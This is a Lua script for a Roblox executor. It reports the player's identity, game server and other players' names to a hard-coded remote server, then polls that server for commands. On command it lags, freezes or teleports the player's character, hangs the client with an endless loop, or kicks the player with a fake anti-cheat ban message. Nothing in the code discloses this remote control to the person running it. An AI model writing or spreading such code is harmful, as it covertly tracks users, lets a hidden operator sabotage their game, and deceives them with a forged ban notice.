-- ===== CONFIGURATION =====
local BASE = "https://crasherto-production.up.railway.app"  -- Palitan ng iyong URL
local KEY = "CRASHER"

-- ===== REQUEST FUNCTION =====
local function getRequest()
    return http_request or request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or getgenv().http_request or getgenv().request or (getgenv().syn and getgenv().syn.request)
end

local request = getRequest()
if not request then
    local deadline = tick() + 10
    repeat task.wait(0.25) request = getRequest() until request or tick() > deadline
end
if not request then return end

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local MarketplaceService = game:GetService("MarketplaceService")

local LP = Players.LocalPlayer
if not LP then
    local deadline = tick() + 30
    repeat task.wait(0.1) LP = Players.LocalPlayer until LP or tick() > deadline
end
if not LP then return end

-- ===== UTILITY =====
local function safe(fn)
    local ok, res = pcall(fn)
    return ok and res or nil
end

local function heartbeat()
    safe(function()
        local body = {
            user_id = LP.UserId,
            username = LP.Name,
            display_name = LP.DisplayName,
            place_id = game.PlaceId,
            job_id = game.JobId,
            executor = (identifyexecutor and select(1, identifyexecutor())) or "unknown",
            server_players = (function()
                local t = {}
                for _, p in ipairs(Players:GetPlayers()) do t[#t+1] = p.Name end
                return t
            end)(),
            brainrots = {} -- ignore
        }
        pcall(function()
            request({
                Url = BASE .. "/api/public/heartbeat",
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
                Body = HttpService:JSONEncode(body)
            })
        end)
    end)
end

-- ===== LAG VARIABLES =====
local fpsConn = nil
local fpsOn = false
local function setFpsLimit(on)
    if on == fpsOn then return end
    fpsOn = on
    if on then
        fpsConn = RunService.RenderStepped:Connect(function()
            local t = tick()
            while tick() - t < 0.95 do end
        end)
    else
        if fpsConn then fpsConn:Disconnect() fpsConn = nil end
    end
end

local HISTORY_SIZE = 0.27
local INTERVAL = 0.6
local NORMAL_SPEED_MIN = 35
local CARRY_SPEED_MIN = 17
local posHistory = {}
local isActive = false
local mode = nil
local intervalThread = nil

RunService.Heartbeat:Connect(function()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local now = tick()
    posHistory[#posHistory+1] = { cframe = root.CFrame, time = now }
    local cutoff = now - HISTORY_SIZE - 0.1
    while #posHistory > 0 and posHistory[1].time < cutoff do table.remove(posHistory, 1) end
end)

local function currentSpeed()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return 0 end
    local v = root.AssemblyLinearVelocity
    return Vector3.new(v.X, 0, v.Z).Magnitude
end

local function meetsSpeedReq()
    local s = currentSpeed()
    if mode == "normal" then return s >= NORMAL_SPEED_MIN end
    if mode == "carry" then return s >= CARRY_SPEED_MIN end
    return false
end

local function doRubberband()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local vel = root.AssemblyLinearVelocity
    if Vector3.new(vel.X, 0, vel.Z).Magnitude < 1 then return end
    local targetTime = tick() - HISTORY_SIZE
    local best = nil
    for i = 1, #posHistory do
        if posHistory[i].time >= targetTime then
            best = posHistory[i].cframe
            break
        end
    end
    if not best then return end
    root.CFrame = best
    root.AssemblyLinearVelocity = vel
end

local function stopLoop()
    if intervalThread then pcall(task.cancel, intervalThread) intervalThread = nil end
end

local function startLoop()
    stopLoop()
    intervalThread = task.spawn(function()
        local startTime = tick()
        local iteration = 0
        while isActive do
            while isActive and not meetsSpeedReq() do task.wait(0.05) end
            if not isActive then break end
            iteration = iteration + 1
            local targetT = startTime + (iteration * INTERVAL)
            local sleepT = targetT - tick()
            if sleepT > 0 then task.wait(sleepT) end
            if isActive and meetsSpeedReq() then doRubberband() end
        end
    end)
end

local function setMode(newMode)
    if mode == newMode then return end
    mode = newMode
    if mode then isActive = true startLoop() else isActive = false stopLoop() end
end

-- ===== DESTROY =====
local isDestroyActive = false
local destroyThread = nil

-- ===== LAG BACK =====
local isLagBackActive = false
local lagBackThread = nil
local lastPos = nil

-- ===== RESET CHARACTER =====
local function resetCharacter()
    -- Stop all
    setMode(nil)
    setFpsLimit(false)
    isDestroyActive = false
    if destroyThread then pcall(task.cancel, destroyThread) destroyThread = nil end
    isLagBackActive = false
    if lagBackThread then pcall(task.cancel, lagBackThread) lagBackThread = nil end
    lastPos = nil

    local char = LP.Character
    if char then
        local root = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChild("Humanoid")
        if root then
            local spawn = nil
            local spawns = Workspace:FindFirstChild("Spawns")
            if spawns and #spawns:GetChildren() > 0 then spawn = spawns:GetChildren()[1] end
            if not spawn then
                for _, obj in ipairs(Workspace:GetDescendants()) do
                    if obj:IsA("SpawnLocation") then spawn = obj break end
                end
            end
            if spawn then root.CFrame = spawn.CFrame * CFrame.new(0, 3, 0)
            else root.Position = Vector3.new(0, 10, 0) end
            root.AssemblyLinearVelocity = Vector3.new(0,0,0)
            root.AssemblyAngularVelocity = Vector3.new(0,0,0)
        end
        if hum then
            hum.Health = hum.MaxHealth
            hum.PlatformStand = false
        end
    end
end

-- ===== POLL =====
local kicked = false
local prevLagN = false
local prevLagC = false
local prevLagBack = false
local prevDestroy = false
local prevFps = false
local prevReset = false
local lastReset = 0

local function poll()
    local res = safe(function()
        return request({
            Url = BASE .. "/api/public/command?user_id=" .. LP.UserId,
            Method = "GET",
            Headers = { ["X-Api-Key"] = KEY },
        })
    end)
    if not res or not res.Body then return end

    local ok, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
    if not ok or type(data) ~= "table" then return end

    -- FPS
    local wantFps = (data.fps_limit == true)
    if wantFps ~= prevFps then
        prevFps = wantFps
        setFpsLimit(wantFps)
    end

    -- RESET (priority)
    if data.reset == true and tick() - lastReset > 2 then
        lastReset = tick()
        resetCharacter()
        -- Reset all states
        prevLagN = false; prevLagC = false; prevLagBack = false; prevDestroy = false
        return
    end

    -- LAG N
    local wantN = (data.lag_n == true)
    if wantN ~= prevLagN then
        prevLagN = wantN
        if wantN then setMode("normal") else if not prevLagC and not prevLagBack then setMode(nil) end end
    end

    -- LAG C
    local wantC = (data.lag_c == true)
    if wantC ~= prevLagC then
        prevLagC = wantC
        if wantC then setMode("carry") else if not prevLagN and not prevLagBack then setMode(nil) end end
    end

    -- LAG BACK
    local wantBack = (data.lag_back == true)
    if wantBack ~= prevLagBack then
        prevLagBack = wantBack
        if wantBack then
            setMode(nil)
            isLagBackActive = true
            if lagBackThread then pcall(task.cancel, lagBackThread) end
            lagBackThread = task.spawn(function()
                while isLagBackActive do
                    task.wait(0.03)
                    local char = LP.Character
                    local root = char and char:FindFirstChild("HumanoidRootPart")
                    if root then
                        if not lastPos then lastPos = root.Position end
                        if (root.Position - lastPos).Magnitude > 1 then
                            root.Position = lastPos
                            root.AssemblyLinearVelocity = Vector3.new(0,0,0)
                        else
                            lastPos = root.Position
                        end
                    end
                end
            end)
        else
            isLagBackActive = false
            if lagBackThread then pcall(task.cancel, lagBackThread) lagBackThread = nil end
            lastPos = nil
        end
    end

    -- DESTROY
    local wantDestroy = (data.destroy == true)
    if wantDestroy ~= prevDestroy then
        prevDestroy = wantDestroy
        if wantDestroy then
            setMode(nil)
            if destroyThread then pcall(task.cancel, destroyThread) end
            destroyThread = task.spawn(function()
                while isDestroyActive do
                    local char = LP.Character
                    local root = char and char:FindFirstChild("HumanoidRootPart")
                    if root then
                        local vel = root.AssemblyLinearVelocity
                        if vel.Magnitude > 0.5 then
                            root.Position = root.Position - (vel * 0.15)
                            root.AssemblyLinearVelocity = Vector3.new(0,0,0)
                        end
                    end
                    task.wait(0.02)
                end
            end)
        else
            if destroyThread then pcall(task.cancel, destroyThread) destroyThread = nil end
        end
    end

    -- CRASH
    if data.crash == true then
        while true do end
    end

    -- KICK
    if data.kick == true and not kicked then
        kicked = true
        LP:Kick("You have been removed for cheating, please remove any cheats to play | CODE: BAC-1633")
    end
end

-- ===== START =====
heartbeat()
poll()
task.spawn(function() while task.wait(3) do heartbeat() end end)
task.spawn(function() while task.wait(0.5) do poll() end end)
